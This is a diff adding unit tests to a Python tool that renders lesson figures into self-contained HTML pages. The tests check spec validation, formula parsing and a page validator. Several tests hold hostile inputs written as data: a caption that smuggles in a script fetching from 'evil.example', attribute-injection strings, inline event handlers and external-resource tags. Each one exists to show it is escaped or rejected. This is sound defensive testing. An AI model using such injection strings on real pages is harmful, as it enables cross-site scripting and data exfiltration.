@@ -128,10 +128,15 @@ class TestExtraction(unittest.TestCase):
             pv.extract_blocks("<!--primer-figure {not json} -->")
         self.assertIn("not valid JSON", str(ctx.exception))
 
-    def test_empty_spec_fails_at_the_first_missing_field(self):
+    def test_empty_spec_fails_with_an_actionable_message(self):
         blocks = pv.extract_blocks("<!--primer-figure {} -->")
         with self.assertRaises(pv.SpecError) as ctx:
             pv.figure_html(blocks[0].spec)
+        self.assertIn("figure id", str(ctx.exception))
+
+    def test_missing_type_is_named(self):
+        with self.assertRaises(pv.SpecError) as ctx:
+            pv.figure_html({"id": "x"})
         self.assertIn("missing required field 'type'", str(ctx.exception))
 
 
@@ -264,7 +269,7 @@ class TestPageBuild(unittest.TestCase):
     def test_builds_and_validates_every_form(self):
         html = good_page(*ALL_FIGURES, EXPLORABLE)
         passed = pv.validate_page(html)
-        self.assertEqual(len(passed), 5)
+        self.assertEqual(len(passed), 6)
 
     def test_manifest_lists_every_block(self):
         page = pv.build_page(artifact_text(SEQUENCE, EXPLORABLE), Path("l.md"))
@@ -314,9 +319,60 @@ class TestValidator(unittest.TestCase):
         self.assertIn("external", str(ctx.exception))
 
     def test_catches_external_stylesheet(self):
-        html = good_page(SEQUENCE).replace("</head>", '<link rel="stylesheet"></head>')
+        html = good_page(SEQUENCE).replace(
+            "</head>", '<link rel="stylesheet" href="https://x.example/a.css"></head>')
         with self.assertRaises(pv.ValidationError):
             pv.validate_page(html)
+
+    def test_catches_srcset_and_poster_and_object_data(self):
+        for tag in ('<img srcset="https://x.example/p.png 1x">',
+                    '<video poster="https://x.example/p.jpg"></video>',
+                    '<object data="https://x.example/o.swf"></object>',
+                    '<meta http-equiv="refresh" content="0;url=https://x.example/">'):
+            with self.subTest(tag=tag):
+                html = good_page(SEQUENCE).replace("</header>", f"</header>{tag}")
+                with self.assertRaises(pv.ValidationError):
+                    pv.validate_page(html)
+
+    def test_catches_inline_event_handler(self):
+        html = good_page(SEQUENCE).replace('<div class="wrap">',
+                                           '<div class="wrap" onmouseover="x()">')
+        with self.assertRaises(pv.ValidationError) as ctx:
+            pv.validate_page(html)
+        self.assertIn("event handler", str(ctx.exception))
+
+    def test_catches_network_calls_in_script(self):
+        for js in ("fetch('/x')", "new XMLHttpRequest()", "eval('x')",
+                   "navigator.sendBeacon('/x')"):
+            with self.subTest(js=js):
+                html = good_page(SEQUENCE).replace("<script>", f"<script>{js};", 1)
+                with self.assertRaises(pv.ValidationError):
+                    pv.validate_page(html)
+
+    def test_protocol_relative_css_url_is_caught(self):
+        html = good_page(SEQUENCE).replace("<style>", "<style>a{background:url(//h/x)}", 1)
+        with self.assertRaises(pv.ValidationError):
+            pv.validate_page(html)
+
+    def test_data_uri_is_allowed(self):
+        html = good_page(SEQUENCE).replace(
+            "</header>", '</header><img src="data:image/gif;base64,R0lGODlhAQABAAAAADs=">')
+        pv.validate_page(html)  # data: is inline, not a network hop
+
+    def test_prose_about_html_does_not_false_positive(self):
+        # A lesson *about* HTML legitimately contains attribute-shaped text. The old
+        # whole-document regex reported these as external references.
+        for prose in ("The href='/next' attribute drives the redirect",
+                      "Use @import sparingly", "src='x' is relative to the document",
+                      "url(https://cdn.example/x) in CSS costs a round trip"):
+            with self.subTest(prose=prose):
+                pv.validate_page(good_page(dict(SEQUENCE, caption=prose)))
+
+    def test_csp_meta_is_present_and_permitted(self):
+        html = good_page(SEQUENCE)
+        self.assertIn("Content-Security-Policy", html)
+        self.assertIn("default-src 'none'", html)
+        pv.validate_page(html)
 
     def test_catches_remote_font_import(self):
         html = good_page(SEQUENCE).replace("<style>", "<style>@import 'x';", 1)
@@ -385,6 +441,292 @@ class TestValidator(unittest.TestCase):
             pv.validate_page(html)
 
 
+class TestHostileStrings(unittest.TestCase):
+    """Spec strings are model-authored and can carry markup. None may reach the DOM."""
+
+    def test_caption_containing_a_comment_terminator_cannot_break_the_manifest(self):
+        # `-->` is Mermaid edge syntax, so a lesson about diagrams may well contain it.
+        html = good_page(dict(SEQUENCE, caption="The A --> B replication edge"))
+        self.assertEqual(html.count("-->"), 1)
+        pv.validate_page(html)
+
+    def test_script_in_a_caption_is_escaped_not_executed(self):
+        hostile = "x --><script>fetch('https://evil.example/')</script><!-- y"
+        html = good_page(dict(SEQUENCE, caption=hostile))
+        self.assertNotIn("<script>fetch", html)
+        self.assertIn("&lt;script&gt;", html)
+        pv.validate_page(html)
+
+    def test_hostile_reveal_and_invariant_are_escaped(self):
+        for key in ("reveal", "invariant"):
+            with self.subTest(key=key):
+                html = good_page(dict(SEQUENCE, **{key: '--><img src="https://e/x">'}))
+                self.assertEqual(html.count("-->"), 1)
+                pv.validate_page(html)
+
+    def test_hostile_slider_bounds_are_rejected_as_non_numeric(self):
+        for field, hostile in (("min", '0" onfocus="fetch(1)" x="'),
+                               ("max", '1"><img srcset="https://e/p.png 1x'),
+                               ("step", "x"), ("value", "{}")):
+            with self.subTest(field=field):
+                spec = json.loads(json.dumps(EXPLORABLE))
+                spec["contract"]["inputs"][0][field] = hostile
+                with self.assertRaises(pv.SpecError) as ctx:
+                    pv.compile_explorable(spec)
+                self.assertIn("must be a number", str(ctx.exception))
+
+    def test_ids_must_match_a_safe_character_set(self):
+        for bad in ("rho\nx", 'a"b', "a b", "1abc", "", "a" * 65, None, 42, "a--></b>"):
+            with self.subTest(bad=bad):
+                with self.assertRaises(pv.SpecError):
+                    pv.figure_html(dict(SEQUENCE, id=bad))
+
+    def test_input_ids_may_not_contain_hyphens(self):
+        # A hyphen would tokenize as subtraction inside a formula.
+        spec = json.loads(json.dumps(EXPLORABLE))
+        spec["contract"]["inputs"][0]["id"] = "rho-bar"
+        spec["formulas"] = {"wait": "1", "head": "1"}
+        with self.assertRaises(pv.SpecError):
+            pv.compile_explorable(spec)
+
+    def test_output_ids_may_contain_hyphens(self):
+        spec = json.loads(json.dumps(EXPLORABLE))
+        spec["contract"]["outputs"][1]["id"] = "latency-p99"
+        spec["formulas"] = {"wait": "rho", "latency-p99": "1 - rho"}
+        pv.compile_explorable(spec)
+
+
+class TestFormulaGrammar(unittest.TestCase):
+    """A legal token sequence is not necessarily legal arithmetic."""
+
+    def test_rejects_comment_injection(self):
+        # `1/*2` compiled to `1/*2`, which opens a JS comment and swallowed the
+        # statements after it — the whole explorable silently stopped updating.
+        with self.assertRaises(pv.SpecError):
+            pv.compile_formula("1/*2", {"rho"}, "wait")
+
+    def test_rejects_unbalanced_and_stray_tokens(self):
+        for expr in ("(", ")", ",", "1 2", "rho rho", "1+", "*2", "(1", "1)"):
+            with self.subTest(expr=expr):
+                with self.assertRaises(pv.SpecError):
+                    pv.compile_formula(expr, {"rho"}, "wait")
+
+    def test_rejects_regex_literal_smuggled_into_a_call(self):
+        with self.assertRaises(pv.SpecError):
+            pv.compile_formula("min(/1/,2)", {"rho"}, "wait")
+
+    def test_enforces_arity(self):
+        for expr in ("min(1)", "max(1,2,3)", "sqrt(1,2)", "pow(2)"):
+            with self.subTest(expr=expr):
+                with self.assertRaises(pv.SpecError) as ctx:
+                    pv.compile_formula(expr, {"rho"}, "wait")
+                self.assertIn("argument", str(ctx.exception))
+
+    def test_function_without_parens_is_rejected(self):
+        with self.assertRaises(pv.SpecError) as ctx:
+            pv.compile_formula("sqrt", {"rho"}, "wait")
+        self.assertIn("needs parentheses", str(ctx.exception))
+
+    def test_subtraction_between_two_inputs_parses(self):
+        js = pv.compile_formula("rho-n", {"rho", "n"}, "wait")
+        self.assertEqual(js, 'v["rho"]-v["n"]')
+
+    def test_accepts_real_expressions(self):
+        cases = {
+            "rho / (1 - rho)": 'v["rho"]/(1-v["rho"])',
+            "-rho + 1": '-v["rho"]+1',
+            "pow(2, rho)": 'Math.pow(2,v["rho"])',
+            "max(rho, 0.1) / min(1, 2)": 'Math.max(v["rho"],0.1)/Math.min(1,2)',
+        }
+        for expr, expected in cases.items():
+            with self.subTest(expr=expr):
+                self.assertEqual(pv.compile_formula(expr, {"rho", "n"}, "w"), expected)
+
+
+class TestContractGuards(unittest.TestCase):
+    def test_unused_input_is_rejected(self):
+        spec = json.loads(json.dumps(EXPLORABLE))
+        spec["contract"]["inputs"].append({"id": "n", "label": "replicas", "min": 1,
+                                           "max": 5, "step": 1, "value": 3})
+        with self.assertRaises(pv.SpecError) as ctx:
+            pv.compile_explorable(spec)
+        self.assertIn("no formula reads", str(ctx.exception))
+
+    def test_decimals_must_be_in_range(self):
+        for bad in (200, -1, 9):
+            with self.subTest(decimals=bad):
+                spec = json.loads(json.dumps(EXPLORABLE))
+                spec["contract"]["outputs"][0]["decimals"] = bad
+                with self.assertRaises(pv.SpecError) as ctx:
+                    pv.compile_explorable(spec)
+                self.assertIn("decimals", str(ctx.exception))
+
+    def test_max_must_exceed_min(self):
+        spec = json.loads(json.dumps(EXPLORABLE))
+        spec["contract"]["inputs"][0]["max"] = 0.05
+        with self.assertRaises(pv.SpecError):
+            pv.compile_explorable(spec)
+
+    def test_duplicate_ids_are_rejected(self):
+        with self.assertRaises(pv.SpecError) as ctx:
+            pv.build_page(artifact_text(SEQUENCE, SEQUENCE), Path("l.md"))
+        self.assertIn("duplicate figure id", str(ctx.exception))
+
+
+class TestRevealGating(unittest.TestCase):
+    def test_invariant_is_gated_for_a_blanked_figure(self):
+        # The invariant is the figure's one claim, so ungated it pre-announces the answer.
+        html = good_page(SEQUENCE)
+        region = pv._figure_region(html, "raft-partition")
+        gated = pv._closed_details_body(region, "raft-partition")
+        self.assertIn(pv.esc(SEQUENCE["invariant"]), gated)
+        self.assertEqual(region.count(pv.esc(SEQUENCE["invariant"])), 1)
+
+    def test_invariant_is_visible_for_an_unblanked_figure(self):
+        html = good_page(LAYERS)
+        region = pv._figure_region(html, "path")
+        self.assertIn(pv.esc(LAYERS["invariant"]), region)
+        self.assertNotIn("<details", region)
+
+    def test_explorable_invariant_is_gated_and_predict_is_not(self):
+        html = good_page(EXPLORABLE)
+        region = pv._figure_region(html, "queue")
+        gated = pv._closed_details_body(region, "queue")
+        self.assertIn(pv.esc(EXPLORABLE["invariant"]), gated)
+        self.assertNotIn(pv.esc(EXPLORABLE["predict"]), gated)
+
+    def test_predict_line_renders_above_a_blanked_figure(self):
+        spec = dict(SEQUENCE, predict="What message has to happen here?")
+        region = pv._figure_region(good_page(spec), "raft-partition")
+        self.assertNotIn(pv.esc(spec["predict"]),
+                         pv._closed_details_body(region, "raft-partition"))
+
+    def test_reveal_without_a_blank_is_rejected(self):
+        with self.assertRaises(pv.SpecError) as ctx:
+            pv.figure_html(dict(LAYERS, reveal="an answer to nothing"))
+        self.assertIn("nothing is blanked", str(ctx.exception))
+
+    def test_render_writes_nothing_when_validation_fails(self):
+        # Guarantee: the learner is told the output path is safe to click, so a page that
+        # failed validation must never exist there — nor destroy a valid earlier one.
+        original = pv.validate_page
+        with tempfile.TemporaryDirectory() as tmp:
+            artifact = Path(tmp) / "l.md"
+            artifact.write_text(artifact_text(SEQUENCE), encoding="utf-8")
+            page = Path(tmp) / "l.view.html"
+            self.assertEqual(pv.main(["render", str(artifact)]), 0)
+            good = page.read_text(encoding="utf-8")
+            pv.validate_page = lambda html: (_ for _ in ()).throw(
+                pv.ValidationError("synthetic failure"))
+            try:
+                self.assertEqual(pv.main(["render", str(artifact)]), 1)
+            finally:
+                pv.validate_page = original
+            self.assertEqual(page.read_text(encoding="utf-8"), good)
+
+
+class TestSpecTypeErrors(unittest.TestCase):
+    """A malformed spec must surface as SpecError, never as a traceback out of the CLI."""
+
+    CASES = [
+        ("curve axis without min/max", CURVE, lambda s: s["spec"].__setitem__("x", {"label": "t"})),
+        ("curve non-numeric axis", CURVE, lambda s: s["spec"]["x"].update({"min": "a"})),
+        ("curve non-numeric points", CURVE,
+         lambda s: s["spec"]["series"][0].__setitem__("points", [["a", "b"], [1, 2]])),
+        ("curve three series", CURVE, lambda s: s["spec"]["series"].extend(
+            [{"label": "b", "points": [[0, 1], [1, 2]]},
+             {"label": "c", "points": [[0, 1], [1, 2]]}])),
+        ("curve knee before the data", CURVE,
+         lambda s: s["spec"].__setitem__("annotate", [{"x": -5, "label": "knee"}])),
+        ("sequence message without from", SEQUENCE,
+         lambda s: s["spec"]["messages"][0].pop("from")),
+        ("sequence participants as strings", SEQUENCE,
+         lambda s: s["spec"].__setitem__("participants", ["L", "F1"])),
+        ("quorum nodes as strings", QUORUM, lambda s: s["spec"].__setitem__("nodes", ["a"])),
+        ("quorum empty group", QUORUM, lambda s: s["spec"].__setitem__("partition", [[]])),
+        ("layers boundary out of range", LAYERS,
+         lambda s: s["spec"].__setitem__("boundary_after", "one")),
+        ("layers boundary past the end", LAYERS,
+         lambda s: s["spec"].__setitem__("boundary_after", 99)),
+        ("state transitions as a dict", STATE,
+         lambda s: s["spec"].__setitem__("transitions", {"a": 1})),
+        ("state transition without to", STATE,
+         lambda s: s["spec"]["transitions"][0].pop("to")),
+        ("timeline span without start", TIMELINE,
+         lambda s: s["spec"]["spans"][0].pop("start")),
+        ("timeline non-numeric start", TIMELINE,
+         lambda s: s["spec"]["spans"][0].__setitem__("start", "soon")),
+        ("spec payload not an object", SEQUENCE, lambda s: s.__setitem__("spec", [1, 2])),
+        ("label over the budget", SEQUENCE,
+         lambda s: s["spec"]["messages"][0].__setitem__("label", "x" * 80)),
+    ]
+
+    def test_all_surface_as_spec_errors(self):
+        for name, base, mutate in self.CASES:
+            with self.subTest(case=name):
+                spec = json.loads(json.dumps(base))
+                mutate(spec)
+                with self.assertRaises(pv.SpecError):
+                    pv.figure_html(spec)
+
+    def test_cli_never_prints_a_traceback(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            for i, (name, base, mutate) in enumerate(self.CASES):
+                with self.subTest(case=name):
+                    spec = json.loads(json.dumps(base))
+                    mutate(spec)
+                    artifact = Path(tmp) / f"a{i}.md"
+                    artifact.write_text(artifact_text(spec), encoding="utf-8")
+                    self.assertEqual(pv.main(["render", str(artifact)]), 1)
+
+
+class TestGeometryEdgeCases(unittest.TestCase):
+    def test_single_element_figures_render(self):
+        cases = [
+            dict(SEQUENCE, blank=[], reveal=None, spec={
+                "participants": [{"id": "L", "label": "Leader"}],
+                "messages": [{"id": "m1", "from": "L", "to": "L", "label": "self"}]}),
+            dict(LAYERS, spec={"layers": [{"label": "only"}]}),
+            dict(QUORUM, blank=[], reveal=None,
+                 spec={"nodes": [{"id": "a", "label": "n1"}], "partition": [["a"]]}),
+        ]
+        for spec in cases:
+            with self.subTest(form=spec["type"]):
+                clean = {k: v for k, v in spec.items() if v is not None}
+                ET.fromstring(pv.RENDERERS[clean["type"]](clean["spec"], set(),
+                                                          clean["id"]))
+
+    def test_self_transition_does_not_draw_through_the_state_box(self):
+        spec = json.loads(json.dumps(STATE))
+        spec["spec"]["transitions"] = [{"id": "t1", "from": "f", "to": "f",
+                                        "label": "heartbeat"}]
+        spec["spec"]["illegal"] = []
+        spec["blank"] = ["t1"]
+        svg = pv.render_state(spec["spec"], {"t1"}, "s")
+        ET.fromstring(svg)
+        self.assertIn("<path", svg)  # a loop arc, not a straight line across the box
+
+    def test_identical_timeline_bounds_do_not_divide_by_zero(self):
+        spec = json.loads(json.dumps(TIMELINE))
+        spec["spec"]["spans"] = [{"id": "s1", "actor": "req", "start": 5, "end": 5,
+                                  "label": "instant"}]
+        ET.fromstring(pv.render_timeline(spec["spec"], set(), "t"))
+
+    def test_numeric_labels_are_coerced_rather_than_crashing(self):
+        spec = json.loads(json.dumps(SEQUENCE))
+        spec["spec"]["notes"][0]["label"] = 42
+        svg = pv.render_sequence(spec["spec"], set(spec["blank"]), "f")
+        ET.fromstring(svg)
+        self.assertIn("42", svg)
+
+    def test_reversed_timeline_span_has_positive_width(self):
+        spec = json.loads(json.dumps(TIMELINE))
+        spec["spec"]["spans"][0].update({"start": 40, "end": 0})
+        svg = pv.render_timeline(spec["spec"], set(), "t")
+        ET.fromstring(svg)
+        self.assertNotIn('width="-', svg)
+
+
 class TestAscii(unittest.TestCase):
     def test_renders_the_four_supported_forms(self):
         for spec in (SEQUENCE, LAYERS, QUORUM, TIMELINE):
@@ -416,6 +758,16 @@ class TestAscii(unittest.TestCase):
                                        reveal="the trust boundary"))
         self.assertNotIn("trust boundary", blanked)
         self.assertIn("trust boundary", pv.ascii_figure(LAYERS))
+
+    def test_unknown_blank_id_is_rejected_on_the_ascii_path_too(self):
+        # This is the channel the learner sees *during* the prediction beat, so a silent
+        # no-op here hands over the answer before the page is ever rendered.
+        with self.assertRaises(pv.SpecError):
+            pv.ascii_figure(dict(SEQUENCE, blank=["m33"]))
+
+    def test_layers_boundary_below_the_last_layer_is_drawn(self):
+        spec = dict(LAYERS, spec={**LAYERS["spec"], "boundary_after": 3})
+        self.assertIn("trust boundary", pv.ascii_figure(spec))
 
     def test_quorum_progress_blank_withholds_the_verdict(self):
         self.assertNotIn("can make progress", pv.ascii_figure(QUORUM))
